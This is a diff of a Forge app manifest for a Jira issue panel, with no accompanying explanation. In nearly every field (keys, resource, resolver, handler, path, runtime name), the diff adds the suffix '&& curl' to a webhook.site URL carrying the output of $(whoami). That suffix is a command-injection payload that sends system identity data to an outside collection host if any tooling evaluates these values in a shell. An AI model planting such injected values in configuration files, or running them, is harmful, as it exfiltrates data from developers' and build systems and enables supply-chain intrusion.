@@ -1,7 +1,7 @@
 modules:
   jira:issuePanel:
     - key: my-test-app-hello-world-issue-panel && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
-      resource: main
+      resource: main && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
       resolver:
         function: resolver && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
       render: native && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
@@ -11,8 +11,8 @@ modules:
     - key: resolver && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
       handler: index.handler && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
 resources:
-  - key: main
-    path: src/frontend/index.jsx
+  - key: main && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
+    path: src/frontend/index.jsx && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
 app:
   runtime:
     name: nodejs24.x && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
